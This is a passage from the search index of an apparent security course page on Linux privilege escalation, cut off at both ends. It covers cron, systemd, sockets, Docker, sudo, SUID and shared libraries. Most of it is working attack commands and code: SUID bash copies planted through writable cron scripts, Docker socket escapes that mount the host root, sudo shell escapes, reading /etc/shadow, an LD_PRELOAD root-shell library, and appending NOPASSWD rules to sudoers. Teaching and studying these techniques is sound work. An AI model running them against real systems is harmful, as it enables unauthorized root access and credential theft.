Usage) sshd:"},{"location":"CS315/2021/Week%2010/#scheduledcron-jobs","title":"Scheduled/Cron jobs","text":"<p>Check if any scheduled job is vulnerable. Maybe you can take advantage of a script being executed by root (wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?).</p> <pre><code>crontab -l\nls -al /etc/cron* /etc/at*\ncat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2&gt;/dev/null | grep -v \"^#\"\n</code></pre>"},{"location":"CS315/2021/Week%2010/#cron-path","title":"Cron path","text":"<p>For example, inside /etc/crontab you can find the PATH: PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</p> <p>(Note how the user \"user\" has writing privileges over /home/user)</p> <p>If inside this crontab the root user tries to execute some command or script without setting the path. For example: <code>root overwrite.sh</code> Then, you can get a root shell by using:</p> <pre><code>echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' &gt; /home/user/overwrite.sh\n#Wait cron job to be executed\n/tmp/bash -p #The effective uid and gid to be set to the real uid and gid\n</code></pre>"},{"location":"CS315/2021/Week%2010/#cron-using-a-script-with-a-wildcard-wildcard-injection","title":"Cron using a script with a wildcard (Wildcard Injection)","text":"<p>If a script being executed by root has a \u201c*\u201d inside a command, you could exploit this to make unexpected things (like privesc). Example:</p> <pre><code>rsync -a *.sh rsync://host.back/src/rbd #You can create a file called \"-e sh myscript.sh\" so the script will execute our script\n</code></pre> <p>If the wildcard is preceded of a path like /some/path/* , it's not vulnerable (even ./* is not).</p> <p>Read the following page for more wildcard exploitation tricks:</p> <p>https://book.hacktricks.xyz/linux-unix/privilege-escalation/wildcards-spare-tricks</p>"},{"location":"CS315/2021/Week%2010/#cron-script-overwriting-and-symlink","title":"Cron script overwriting and symlink","text":"<p>If you can modify a cron script executed by root, you can get a shell very easily:</p> <pre><code>echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' &gt; &lt;/PATH/CRON/SCRIPT&gt;\n#Wait until it is executed\n/tmp/bash -p\n</code></pre> <p>If the script executed by root uses a directory where you have full access, maybe it could be useful to delete that folder and create a symlink folder to another one serving a script controlled by you</p> <pre><code>ln -d -s &lt;/PATH/TO/POINT&gt; &lt;/PATH/CREATE/FOLDER&gt;\n</code></pre>"},{"location":"CS315/2021/Week%2010/#frequent-cron-jobs","title":"Frequent cron jobs","text":"<p>You can monitor the processes to search for processes that are being executed every 1,2 or 5 minutes. Maybe you can take advantage of it and escalate privileges.</p> <p>For example, to monitor every 0.1s during 1 minute, sort by less executed commands and deleting the commands that have beeing executed all the time, you can do:</p> <pre><code>for i in $(seq 1 610); do ps -e --format cmd &gt;&gt; /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v \"\\[\" | sed '/^.\\{200\\}./d' | sort | grep -E -v \"\\s*[6-9][0-9][0-9]|\\s*[0-9][0-9][0-9][0-9]\"; rm /tmp/monprocs.tmp;\n</code></pre> <p>You can also use pspy (this will monitor and list every process that start).</p>"},{"location":"CS315/2021/Week%2010/#invisible-cron-jobs","title":"Invisible cron jobs","text":"<p>It's possible to create a cronjob putting a carriage return after a comment (without new line character), and the cron job will work. Example (note the carriege return char):</p> <pre><code>#This is a comment inside a cron config file\\r* * * * * echo \"Surprise!\"\n</code></pre>"},{"location":"CS315/2021/Week%2010/#services","title":"Services","text":""},{"location":"CS315/2021/Week%2010/#writable-service-files","title":"Writable .service files","text":"<p>Check if you can write any <code>.service</code> file, if you can, you could modify it so it executes your backdoor when the service is started, restarted or stopped (maybe you will need to wait until the machine is rebooted). For example create your backdoor inside the .service file with <code>ExecStart=/tmp/script.sh</code></p>"},{"location":"CS315/2021/Week%2010/#writable-service-binaries","title":"Writable service binaries","text":"<p>Keep in mid that if you have write permissions over binaries being executed by services, you can change them for backdoors so when the services get re-executed the backdoors will be executed.</p>"},{"location":"CS315/2021/Week%2010/#systemd-path-relative-paths","title":"systemd PATH - Relative Paths","text":"<p>You can see the PATH used by systemd with:</p> <pre><code>systemctl show-environment\n</code></pre> <p>If you find that you can write in any of the folders of the path you may be able to escalate privileges. You need to search for relative paths being used on service configurations files like:</p> <pre><code>ExecStart=faraday-server\nExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'\nExecStop=/bin/sh \"uptux-vuln-bin3 -stuff -hello\"\n</code></pre> <p>Then, create a executable with the same name as the relative path binary inside the systemd PATH folder you can write, and when the service is asked to execute the vulnerable action (Start, Stop, Reload), your backdoor will be executed (unprivileged users usually cannot start/stop services but check if you can using <code>sudo -l</code>).</p> <p>Learn more about services with <code>man systemd.service</code>.</p>"},{"location":"CS315/2021/Week%2010/#timers","title":"Timers","text":"<p>Timers are systemd unit files whose name ends in . timer that control . service files or events. Timers can be used as an alternative to cron. Timers have built-in support for calendar time events, monotonic time events, and can be run asynchronously.</p> <p>You can enumerate all the timers doing:</p> <pre><code>systemctl list-timers --all\n</code></pre>"},{"location":"CS315/2021/Week%2010/#writable-timers","title":"Writable timers","text":"<p>If you can modify a timer you can make it execute some existent systemd.unit (like a <code>.service</code> or a <code>.target</code>)</p> <pre><code>Unit=backdoor.service\n</code></pre> <p>In the documentation you can read what the Unit is:</p> <p>The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not \".timer\". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.</p> <p>Therefore, in order to abuse this permissions you would need to:</p> <ul> <li>Find some systemd unit (like a <code>.service</code>) that is executing a writable binary</li> <li>Find some systemd unit that is executing a relative path and you have writable privileges over the systemd PATH (to impersonate that executable)</li> </ul> <p>Learn more about timers with <code>man systemd.timer</code>.</p>"},{"location":"CS315/2021/Week%2010/#enabling-timer","title":"Enabling Timer","text":"<p>In order to enable a timer you need root privileges and to execute:</p> <pre><code>sudo systemctl enable backu2.timer\nCreated symlink /etc/systemd/system/multi-user.target.wants/backu2.timer \u2192 /lib/systemd/system/backu2.timer.\n</code></pre> <p>Note the timer is activated by creating a symlink to it on <code>/etc/systemd/system/&lt;WantedBy_section&gt;.wants/&lt;name&gt;.timer</code></p>"},{"location":"CS315/2021/Week%2010/#sockets","title":"Sockets","text":"<p>In brief, a Unix Socket (technically, the correct name is Unix domain socket, UDS) allows communication between two different processes on either the same machine or different machines in client-server application frameworks. To be more precise, it\u2019s a way of communicating among computers using a standard Unix descriptors file. (From here).</p> <p>Sockets can be configured using <code>.socket</code> files.</p> <p>Learn more about sockets with <code>man systemd.socket</code>. Inside this file some several interesting parameters can be configured:</p> <ul> <li><code>ListenStream</code>, <code>ListenDatagram</code>, <code>ListenSequentialPacket</code>, <code>ListenFIFO</code>, <code>ListenSpecial</code>, <code>ListenNetlink</code>, <code>ListenMessageQueue</code>, <code>ListenUSBFunction</code>: This options are different but as summary as used to indicate where is going to listen the socket (the path of the AF_UNIX socket file, the IPv4/6 and/or port number to listen...).</li> <li><code>Accept</code>: Takes a boolean argument. If true, a service instance is spawned for each incoming connection and only the connection socket is passed to it. If false, all listening sockets themselves are passed to the started service unit, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. Defaults to false. For performance reasons, it is recommended to write new daemons only in a way that is suitable for <code>Accept=no</code>.</li> <li><code>ExecStartPre</code>, <code>ExecStartPost</code>: Takes one or more command lines, which are executed before or after the listening sockets/FIFOs are created and bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process.</li> <li><code>ExecStopPre</code>, <code>ExecStopPost</code>: Additional commands that are executed before or after the listening sockets/FIFOs are closed and removed, respectively.</li> <li><code>Service</code>: Specifies the service unit name to activate on incoming traffic. This setting is only allowed for sockets with Accept=no. It defaults to the service that bears the same name as the socket (with the suffix replaced). In most cases, it should not be necessary to use this option.</li> </ul>"},{"location":"CS315/2021/Week%2010/#writable-socket-files","title":"Writable .socket files","text":"<p>If you find a writable <code>.socket</code> file you can add at the beginning of the <code>[Socket]</code> section something like: <code>ExecStartPre=/home/kali/sys/backdoor</code> and the backdoor will be executed before the socket is created. Therefore, you will probably need to wait until the machine is rebooted. Note that the system must be using that socket file configuration or the backdoor won't be executed</p>"},{"location":"CS315/2021/Week%2010/#writable-sockets","title":"Writable sockets","text":"<p>If you identify any writable socket (now where are talking about Unix Sockets, not about the config <code>.socket</code> files), then, you can communicate with that socket and maybe exploit a vulnerability.</p>"},{"location":"CS315/2021/Week%2010/#enumerate-unix-sockets","title":"Enumerate Unix Sockets","text":"<pre><code>netstat -a -p --unix\n</code></pre>"},{"location":"CS315/2021/Week%2010/#raw-connection","title":"Raw connection","text":"<pre><code>#apt-get install netcat-openbsd\nnc -U /tmp/socket  #Connect to UNIX-domain stream socket\nnc -uU /tmp/socket #Connect to UNIX-domain datagram socket\n\n#apt-get install socat\nsocat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type\n</code></pre> <p>Exploitation example:</p> <p>https://book.hacktricks.xyz/linux-unix/privilege-escalation/socket-command-injection</p>"},{"location":"CS315/2021/Week%2010/#http-sockets","title":"HTTP sockets","text":"<p>Note that there may be some sockets listening for HTTP requests (I'm not talking about .socket files but about the files acting as unix sockets). You can check this with:</p> <pre><code>curl --max-time 2 --unix-socket /pat/to/socket/files http:/index\n</code></pre> <p>If the socket respond with a HTTP request, then you can communicate with it and maybe exploit some vulnerability.</p>"},{"location":"CS315/2021/Week%2010/#writable-docker-socket","title":"Writable Docker Socket","text":"<p>The docker socket is typically located at <code>/var/run/docker.sock</code> and is only writable by <code>root</code> user and <code>docker</code> group. If for some reason you have write permissions over that socket you can escalate privileges. The following commands can be used to escalate privileges:</p> <pre><code>docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash\ndocker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh\n</code></pre>"},{"location":"CS315/2021/Week%2010/#use-docker-web-api-from-socket-without-docker-package","title":"Use docker web API from socket without docker package","text":"<p>If you have access to docker socket but you can't use the docker binary (maybe it isn't even installed), you can use directly the web API with <code>curl</code>.</p> <p>The following commands are a example to create a docker container that mount the root of the host system and use <code>socat</code> to execute commands into the new docker.</p> <pre><code># List docker images\ncurl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json\n##[{\"Containers\":-1,\"Created\":1588544489,\"Id\":\"sha256:&lt;ImageID&gt;\",...}]\n# Send JSON to docker API to create the container\ncurl -XPOST -H \"Content-Type: application/json\" --unix-socket /var/run/docker.sock -d '{\"Image\":\"&lt;ImageID&gt;\",\"Cmd\":[\"/bin/sh\"],\"DetachKeys\":\"Ctrl-p,Ctrl-q\",\"OpenStdin\":true,\"Mounts\":[{\"Type\":\"bind\",\"Source\":\"/\",\"Target\":\"/host_root\"}]}' http://localhost/containers/create\n##{\"Id\":\"&lt;NewContainerID&gt;\",\"Warnings\":[]}\ncurl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/&lt;NewContainerID&gt;/start\n</code></pre> <p>The last step is to use <code>socat</code> to initiate a connection to the container, sending an attach request</p> <pre><code>socat - UNIX-CONNECT:/var/run/docker.sock\nPOST /containers/&lt;NewContainerID&gt;/attach?stream=1&amp;stdin=1&amp;stdout=1&amp;stderr=1 HTTP/1.1\nHost:\nConnection: Upgrade\nUpgrade: tcp\n\n#HTTP/1.1 101 UPGRADED\n#Content-Type: application/vnd.docker.raw-stream\n#Connection: Upgrade\n#Upgrade: tcp\n</code></pre> <p>Now, you can execute commands on the container from this <code>socat</code> connection.</p>"},{"location":"CS315/2021/Week%2010/#others","title":"Others","text":"<p>Note that if you have write permissions over the docker socket because you are inside the group <code>docker</code> you have more ways to escalate privileges. If the docker API is listening in a port you can also be able to compromise it.</p>"},{"location":"CS315/2021/Week%2010/#containerd-ctr-privilege-escalation","title":"Containerd (ctr) privilege escalation","text":"<p>If you find that you can use the <code>ctr</code> command read the following page as you may be able to abuse it to escalate privileges:</p> <p>https://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation</p>"},{"location":"CS315/2021/Week%2010/#runc-privilege-escalation","title":"RunC privilege escalation","text":"<p>If you find that you can use the <code>runc</code> command read the following page as you may be able to abuse it to escalate privileges:</p> <p>https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation</p>"},{"location":"CS315/2021/Week%2010/#d-bus","title":"D-Bus","text":"<p>D-BUS is an inter-process communication (IPC) system, providing a simple yet powerful mechanism allowing applications to talk to one another, communicate information and request services. D-BUS was designed from scratch to fulfil the needs of a modern Linux system.</p> <p>D-BUS, as a full-featured IPC and object system, has several intended uses. First, D-BUS can perform basic application IPC, allowing one process to shuttle data to another\u2014think UNIX domain sockets on steroids. Second, D-BUS can facilitate sending events, or signals, through the system, allowing different components in the system to communicate and ultimately to integrate better. For example, a Bluetooth daemon can send an incoming call signal that your music player can intercept, muting the volume until the call ends. Finally, D-BUS implements a remote object system, letting one application request services and invoke methods from a different object\u2014think CORBA without the complications. (From here).</p> <p>D-Bus uses an allow/deny model, where each message (method call, signal emission, etc.) can be allowed or denied according to the sum of all policy rules which match it. Each or rule in the policy should have the <code>own</code>, <code>send_destination</code> or <code>receive_sender</code> attribute set.</p> <p>Part of the policy of <code>/etc/dbus-1/system.d/wpa_supplicant.conf</code>:</p> <pre><code>&lt;policy user=\"root\"&gt;\n    &lt;allow own=\"fi.w1.wpa_supplicant1\"/&gt;\n    &lt;allow send_destination=\"fi.w1.wpa_supplicant1\"/&gt;\n    &lt;allow send_interface=\"fi.w1.wpa_supplicant1\"/&gt;\n    &lt;allow receive_sender=\"fi.w1.wpa_supplicant1\" receive_type=\"signal\"/&gt;\n&lt;/policy&gt;\n</code></pre> <p>Therefore, if a policy is allowing your user in anyway to interact with the bus, you could be able to exploit it to escalate privileges (maybe just listing for some passwords?).</p> <p>Note that a policy that doesn't specify any user or group affects everyone (<code>&lt;policy&gt;</code>). Policies to the context \"default\" affects everyone not affected by other policies (<code>&lt;policy context=\"default\"</code>).</p> <p>Learn how to enumerate and exploit a D-Bus communication here:</p> <p>https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation</p>"},{"location":"CS315/2021/Week%2010/#network","title":"Network","text":"<p>It's always interesting to enumerate the network and figure out the position of the machine.</p>"},{"location":"CS315/2021/Week%2010/#generic-enumeration","title":"Generic enumeration","text":"<pre><code>#Hostname, hosts and DNS\ncat /etc/hostname /etc/hosts /etc/resolv.conf\ndnsdomainname\n\n#Content of /etc/inetd.conf &amp; /etc/xinetd.conf\ncat /etc/inetd.conf /etc/xinetd.conf\n\n#Interfaces\ncat /etc/networks\n(ifconfig || ip a)\n\n#Neighbours\n(arp -e || arp -a)\n(route || ip n)\n\n#Iptables rules\n(timeout 1 iptables -L 2&gt;/dev/null; cat /etc/iptables/* | grep -v \"^#\" | grep -Pv \"\\W*\\#\" 2&gt;/dev/null)\n\n#Files used by network services\nlsof -i\n</code></pre>"},{"location":"CS315/2021/Week%2010/#open-ports","title":"Open ports","text":"<p>Always check network services running on the machine that you wasn't able to interact with before accessing to it:</p> <pre><code>(netstat -punta || ss --ntpu)\n(netstat -punta || ss --ntpu) | grep \"127.0\"\n</code></pre>"},{"location":"CS315/2021/Week%2010/#sniffing","title":"Sniffing","text":"<p>Check if you can sniff traffic. If you can, you could be able to grab some credentials.</p> <pre><code>timeout 1 tcpdump\n</code></pre>"},{"location":"CS315/2021/Week%2010/#users","title":"Users","text":""},{"location":"CS315/2021/Week%2010/#generic-enumeration_1","title":"Generic Enumeration","text":"<p>Check who you are, which privileges do you have, which users are in the systems, which ones can login and which ones have root privileges:</p> <pre><code>#Info about me\nid || (whoami &amp;&amp; groups) 2&gt;/dev/null\n#List all users\ncat /etc/passwd | cut -d: -f1\n#List users with console\ncat /etc/passwd | grep \"sh$\"\n#List superusers\nawk -F: '($3 == \"0\") {print}' /etc/passwd\n#Currently logged users\nw\n#Login history\nlast | tail\n#Last log of each user\nlastlog\n\n#List all users and their groups\nfor i in $(cut -d\":\" -f1 /etc/passwd 2&gt;/dev/null);do id $i;done 2&gt;/dev/null | sort\n#Current user PGP keys\ngpg --list-keys 2&gt;/dev/null\n</code></pre>"},{"location":"CS315/2021/Week%2010/#big-uid","title":"Big UID","text":"<p>Some Linux versions were affected by a bug that allow users with UID &gt; INT_MAX to escalate privileges. More info: here, here and here. Exploit it using: <code>systemd-run -t /bin/bash</code></p>"},{"location":"CS315/2021/Week%2010/#groups","title":"Groups","text":"<p>Check if you are a member of some group that could grant you root privileges:</p> <p>https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe</p>"},{"location":"CS315/2021/Week%2010/#clipboard","title":"Clipboard","text":"<p>Check if anything interesting is located inside the clipboard (if possible)</p> <pre><code>if [ `which xclip 2&gt;/dev/null` ]; then\n    echo \"Clipboard: \"`xclip -o -selection clipboard 2&gt;/dev/null`\n    echo \"Highlighted text: \"`xclip -o 2&gt;/dev/null`\n  elif [ `which xsel 2&gt;/dev/null` ]; then\n    echo \"Clipboard: \"`xsel -ob 2&gt;/dev/null`\n    echo \"Highlighted text: \"`xsel -o 2&gt;/dev/null`\n  else echo \"Not found xsel and xclip\"\n  fi\n</code></pre>"},{"location":"CS315/2021/Week%2010/#password-policy","title":"Password Policy","text":"<pre><code>grep \"^PASS_MAX_DAYS\\|^PASS_MIN_DAYS\\|^PASS_WARN_AGE\\|^ENCRYPT_METHOD\" /etc/login.defs\n</code></pre>"},{"location":"CS315/2021/Week%2010/#known-passwords","title":"Known passwords","text":"<p>If you know any password of the environment try to login as each user using the password.</p>"},{"location":"CS315/2021/Week%2010/#su-brute","title":"Su Brute","text":"<p>If don't mind about doing a lot of noise and <code>su</code> and <code>timeout</code> binaries are present on the computer you can try to brute-force user using su-bruteforce. Linpeas with <code>-a</code> parameter also try to brute-force users.</p>"},{"location":"CS315/2021/Week%2010/#writable-path-abuses","title":"Writable PATH abuses","text":""},{"location":"CS315/2021/Week%2010/#path_1","title":"$PATH","text":"<p>If you find that you can write inside some folder of the $PATH you may be able to escalate privileges by creating a backdoor inside the writable folder with the name of some command that is going to be executed by a different user (root ideally) and that is not loaded from a folder that is located previous to your writable folder in $PATH.</p>"},{"location":"CS315/2021/Week%2010/#sudo-and-suid","title":"SUDO and SUID","text":"<p>You could be allowed to execute some command using sudo or they could have the suid bit. Check it using:</p> <pre><code>sudo -l #Check commands you can execute with sudo\nfind / -perm -4000 2&gt;/dev/null #Find all SUID binaries\n</code></pre> <p>Some unexpected commands allows you to read and/or write files or even execute command. For example:</p> <pre><code>sudo awk 'BEGIN {system(\"/bin/sh\")}'\nsudo find /etc -exec sh -i \\;\nsudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh\nsudo tar c a.tar -I ./runme.sh a\nftp&gt;!/bin/sh\nless&gt;! &lt;shell_comand&gt;\n</code></pre>"},{"location":"CS315/2021/Week%2010/#nopasswd","title":"NOPASSWD","text":"<p>Sudo configuration might allow a user to execute some command with another user privileges without knowing the password.</p> <pre><code>$ sudo -l\nUser demo may run the following commands on crashlab:\n    (root) NOPASSWD: /usr/bin/vim\n</code></pre> <p>In this example the user <code>demo</code> can run <code>vim</code> as <code>root</code>, it is now trivial to get a shell by adding an ssh key into the root directory or by calling <code>sh</code>.</p> <pre><code>sudo vim -c '!sh'\n</code></pre>"},{"location":"CS315/2021/Week%2010/#setenv","title":"SETENV","text":"<p>This directive allows the user to set an environment variable while executing something:</p> <pre><code>$ sudo -l\nUser waldo may run the following commands on admirer:\n    (ALL) SETENV: /opt/scripts/admin_tasks.sh\n</code></pre> <p>This example, based on HTB machine Admirer, was vulnerable to PYTHONPATH hijacking in order to load an arbitrary python library while executing the script as root:</p> <pre><code>sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh\n</code></pre>"},{"location":"CS315/2021/Week%2010/#sudo-execution-bypassing-paths","title":"Sudo execution bypassing paths","text":"<p>Jump to read other files or use symlinks. For example in sudeores file: hacker10 ALL= (root) /bin/less /var/log/*</p> <pre><code>sudo less /var/logs/anything\nless&gt;:e /etc/shadow #Jump to read other files using privileged less\nln /etc/shadow /var/log/new\nsudo less /var/log/new #Use symlinks to read any file\n</code></pre> <p>If a wilcard is used (*), it is even easier:</p> <pre><code>sudo less /var/log/../../etc/shadow #Read shadow\nsudo less /var/log/something /etc/shadow #Red 2 files\n</code></pre> <p>Countermeasures: https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/</p>"},{"location":"CS315/2021/Week%2010/#sudo-commandsuid-binary-without-command-path","title":"Sudo command/SUID binary without command path","text":"<p>If the sudo permission is given to a single command without specifying the path: hacker10 ALL= (root) less you can exploit it by changing the PATH variable</p> <pre><code>export PATH=/tmp:$PATH\n#Put your backdoor in /tmp and name it \"less\"\nsudo less\n</code></pre> <p>This technique can also be used if a suid binary executes another command without specifying the path to it (always check with strings the content of a weird SUID binary).</p> <p>Payload examples to execute.</p>"},{"location":"CS315/2021/Week%2010/#suid-binary-with-command-path","title":"SUID binary with command path","text":"<p>If the suid binary executes another command specifying the path, then, you can try to export a function named as the command that the suid file is calling.</p> <p>For example, if a suid binary calls /usr/sbin/service apache2 start you have to try to create the function and export it:</p> <pre><code>function /usr/sbin/service() { cp /bin/bash /tmp &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p; }\nexport -f /usr/sbin/service\n</code></pre> <p>Then, when you call the suid binary, this function will be executed</p>"},{"location":"CS315/2021/Week%2010/#ld_preload","title":"LD_PRELOAD","text":"<p>LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.</p> <p>To avoid this mechanism being used as an attack vector for suid/sgid executable binaries, the loader ignores LD_PRELOAD if ruid != euid. For such binaries, only libraries in standard paths that are also suid/sgid will be preloaded.</p> <p>If you find inside the output of <code>sudo -l</code> the sentence: env_keep+=LD_PRELOAD and you can call some command with sudo, you can escalate privileges.</p> <pre><code>Defaults        env_keep += LD_PRELOAD\n</code></pre> <p>Save as /tmp/pe.c</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid _init() {\n    unsetenv(\"LD_PRELOAD\");\n    setgid(0);\n    setuid(0);\n    system(\"/bin/bash\");\n}\n</code></pre> <p>Then compile it using:</p> <pre><code>cd /tmp\ngcc -fPIC -shared -o pe.so pe.c -nostartfiles\n</code></pre> <p>Finally, escalate privileges running</p> <pre><code>sudo LD_PRELOAD=pe.so &lt;COMMAND&gt; #Use any command you can run with sudo\n</code></pre>"},{"location":"CS315/2021/Week%2010/#suid-binary-so-injection","title":"SUID Binary \u2013 so injection","text":"<p>If you find some weird binary with SUID permissions, you could check if all the .so files are loaded correctly. In order to do so you can execute:</p> <pre><code>strace &lt;SUID-BINARY&gt; 2&gt;&amp;1 | grep -i -E \"open|access|no such file\"\n</code></pre> <p>For example, if you find something like: pen(\u201c/home/user/.config/libcalc.so\u201d, O_RDONLY) = -1 ENOENT (No such file or directory) you can exploit it.</p> <p>Create the file /home/user/.config/libcalc.c with the code:</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstatic void inject() __attribute__((constructor));\n\nvoid inject(){\n    system(\"cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p\");\n}\n</code></pre> <p>Compile it using:</p> <pre><code>gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c\n</code></pre> <p>And execute the binary.</p>"},{"location":"CS315/2021/Week%2010/#gtfobins","title":"GTFOBins","text":"<p>GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.</p> <p>The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.</p> <p>gdb -nx -ex '!sh' -ex quit sudo mysql -e '! /bin/sh' strace -o /dev/null /bin/sh sudo awk 'BEGIN {system(\"/bin/sh\")}'</p> <p>https://gtfobins.github.io/</p>"},{"location":"CS315/2021/Week%2010/#fallofsudo","title":"FallOfSudo","text":"<p>If you can access <code>sudo -l</code> you can use the tool FallOfSudo to check if it finds how to exploit any sudo rule.</p>"},{"location":"CS315/2021/Week%2010/#reusing-sudo-tokens","title":"Reusing Sudo Tokens","text":"<p>In the scenario where you have a shell as a user with sudo privileges but you don't know the password of the user, you can wait him to execute some command using <code>sudo</code>. Then, you can access the token of the session where sudo was used and use it to execute anything as sudo (privilege escalation).</p> <p>Requirements to escalate privileges:</p> <ul> <li>You already have a shell as user \"sampleuser\"</li> <li>\"sampleuser\" have used <code>sudo</code> to execute something in the last 15mins (by default that's the duration of the sudo token that allows to use <code>sudo</code> without introducing any password)</li> <li><code>cat /proc/sys/kernel/yama/ptrace_scope</code> is 0</li> <li><code>gdb</code> is accessible (you can be able to upload it)</li> </ul> <p>(You can temporarily enable <code>ptrace_scope</code> with <code>echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope</code> or permanently modifying <code>/etc/sysctl.d/10-ptrace.conf</code> and setting <code>kernel.yama.ptrace_scope = 0</code>)</p> <p>If all these requirements are met, you can escalate privileges using: https://github.com/nongiach/sudo_inject</p> <ul> <li>The first exploit (<code>exploit.sh</code>) will create the binary <code>activate_sudo_token</code> in /tmp. You can use it to activate the sudo token in your session (you won't get automatically a root shell, do <code>sudo su</code>):</li> </ul> <pre><code>bash exploit.sh\n/tmp/activate_sudo_token\nsudo su\n</code></pre> <ul> <li>The second exploit (<code>exploit_v2.sh</code>) will create a sh shell in /tmp owned by root with setuid</li> </ul> <pre><code>bash exploit_v2.sh\n/tmp/sh -p\n</code></pre> <ul> <li>The third exploit (<code>exploit_v3.sh</code>) will create a sudoers file that makes sudo tokens eternal and allows all users to use sudo</li> </ul> <pre><code>bash exploit_v3.sh\nsudo su\n</code></pre>"},{"location":"CS315/2021/Week%2010/#varrunsudots","title":"/var/run/sudo/ts/ <p>If you have write permissions in the folder or on any of the created files inside the folder you can use the binary write_sudo_token to create a sudo token for a user and PID. For example if you can overwrite the file /var/run/sudo/ts/sampleuser and you have a shell as that user with PID 1234, you can obtain sudo privileges without needing to know the password doing:</p> <pre><code>./write_sudo_token 1234 &gt; /var/run/sudo/ts/sampleuser\n</code></pre>","text":""},{"location":"CS315/2021/Week%2010/#etcsudoers-etcsudoersd","title":"/etc/sudoers, /etc/sudoers.d <p>The file <code>/etc/sudoers</code> and the files inside <code>/etc/sudoers.d</code> configure who can use <code>sudo</code> and how. This files by default can only be read by user root and group root. If you can read this file you could be able to obtain some interesting information, and if you can write any file you will be able to escalate privileges.</p> <pre><code>ls -l /etc/sudoers /etc/sudoers.d/\nls -ld /etc/sudoers.d/\n</code></pre> <p>If you can write you can abuse this permissions</p> <pre><code>echo \"$(whoami) ALL=(ALL) NOPASSWD: ALL\" &gt;&gt; /etc/sudoers\necho \"$(whoami) ALL=(ALL) NOPASSWD: ALL\" &gt;&gt; /etc/sudoers.d/README\n</code></pre> <p>Other way to abuse these permissions:</p> <pre><code># makes it so every terminal can sudo  \necho \"Defaults !tty_tickets\" &gt; /etc/sudoers.d/win\n# makes it so sudo never times out\necho \"Defaults timestamp_timeout=-1\" &gt;&gt; /etc/sudoers.d/win\n</code></pre>","text":""},{"location":"CS315/2021/Week%2010/#doas","title":"DOAS <p>There are some alternatives to the <code>sudo</code> binary such as <code>doas</code> for OpenBSD, remember to check its configuration at <code>/etc/doas.conf</code></p> <pre><code>permit nopass demo as root cmd vim\n</code></pre>","text":""},{"location":"CS315/2021/Week%2010/#sudo-hijacking","title":"Sudo Hijacking <p>If you know that a user usually connects to a machine and uses <code>sudo</code> to escalate privileges and you got a shell within that user context, you can create a new sudo executable that will execute your code as root and then the users command. Then, modify the $PATH of the user context (for example adding the new path in .bash_profile) so we the user executed sudo, your sudo executable is executed.</p> <p>Note that if the user uses a different shell (not bash) you will need to modify other files to add the new path. For example sudo-piggyback modifies <code>~/.bashrc</code>, <code>~/.zshrc</code>, <code>~/.bash_profile</code>. You can find another example in bashdoor.py</p>","text":""},{"location":"CS315/2021/Week%2010/#shared-library","title":"Shared Library","text":""},{"location":"CS315/2021/Week%2010/#ldso","title":"ld.so <p>The file <code>/etc/ld.so.conf</code> indicates where are loaded the configurations files from. Typically, this file contains the following path: <code>include /etc/ld.so.conf.d/*.conf</code></p> <p>That means that the configuration files from <code>/etc/ld.so.conf.d/*.conf</code> will be read. This configuration files points to another folders where libraries are going to be searched for. For example, the content of <code>/etc/ld.so.conf.d/libc.conf</code> is <code>/usr/local/lib</code>. This means that the system will search for libraries inside <code>/usr/local/lib</code>.</p> <p>If for some reason a user has write permissions on any of the paths indicated: <code>/etc/ld.so.conf</code>, <code>/etc/ld.so.conf.d/</code>, any file inside <code>/etc/ld.so.conf.d/</code> or any folder indicated inside any config file inside <code>/etc/ld.so.conf.d/*.conf</code> he may be able to escalate privileges. Take a look about how to exploit this misconfiguration in the following page:</p> <p>https://book.hacktricks.xyz/linux-unix/privilege-escalation/ld.so.conf-example</p>","text":""},{"location":"CS315/2021/Week%2010/#rpath","title":"RPATH <pre><code>level15@nebula:/home/flag15$ readelf -d flag15 | egrep \"NEEDED|RPATH\"\n 0x00000001 (NEEDED)                     Shared library: [libc.so.6]\n 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]\n\nlevel15@nebula:/home/flag15$ ldd ./flag15\n linux-gate.so.1 =&gt;  (0x0068c000)\n libc.so.6 =&gt; 